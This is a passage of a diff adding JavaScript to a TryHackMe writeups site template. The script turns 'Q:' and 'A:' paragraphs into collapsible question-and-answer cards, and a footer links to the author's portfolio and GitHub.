+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
